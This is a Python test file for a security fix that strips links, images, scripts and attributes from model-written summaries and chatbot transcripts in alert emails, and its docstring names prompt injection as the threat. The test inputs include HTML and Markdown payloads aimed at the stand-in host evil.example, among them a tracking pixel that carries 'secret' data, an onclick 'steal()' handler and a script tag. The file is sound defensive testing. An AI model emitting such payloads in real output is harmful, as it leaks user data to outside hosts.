"""S5: model-written text in alert emails can't carry links, images or markup.

The alert summary was passed through verbatim whenever it started with
``<``, and bot answers in the transcript were rendered from Markdown with
links and images intact. Either can be steered by prompt injection, and
the email goes out from the customer's own relay.
"""
from __future__ import annotations

import pytest

from services.email_html import sanitize_email_html
from services.widget_email import _normalize_summary_to_html, _render_transcript


@pytest.mark.parametrize("raw", [
    '<p>Hi <a href="https://evil.example/x">click</a></p>',
    '<p>Hi</p><img src="https://evil.example/pixel?d=secret">',
    '<p onclick="steal()">Hi</p><script>alert(1)</script>',
    '<p style="background:url(https://evil.example/p)">Hi</p>',
    'Hi [click](https://evil.example/x) ![](https://evil.example/pixel)',
    "<p>Hi</p><iframe src='https://evil.example'></iframe>",
])
def test_summary_keeps_no_links_images_or_attributes(raw):
    out = _normalize_summary_to_html(raw)
    assert "evil.example" not in out
    for bad in ("<a", "<img", "<script", "<iframe", "onclick", "style=", "href", "src="):
        assert bad not in out
    assert "Hi" in out


def test_plain_formatting_survives():
    out = _normalize_summary_to_html("## Request\n\n- **Leave** balance\n- dates\n")
    assert out.count("<li>") == 2 and "<strong>Leave</strong>" in out and "<h2>" in out


def test_text_is_escaped_and_tags_balanced():
    assert sanitize_email_html("<p>1 &lt; 2 & <b>bold") == "<p>1 &lt; 2 &amp; <b>bold</b></p>"
    assert sanitize_email_html("<ul><li>a</ul></li>") == "<ul><li>a</li></ul>"


def test_transcript_answers_lose_links_and_images():
    class M:
        def __init__(self, role, message):
            self.role, self.message = role, message

    out = _render_transcript([M("assistant", "See ![x](https://evil.example/p?q=hi) [here](https://evil.example)"),
                              M("user", "<b>hi</b>")])
    assert "evil.example" not in out
    assert "&lt;b&gt;hi&lt;/b&gt;" in out
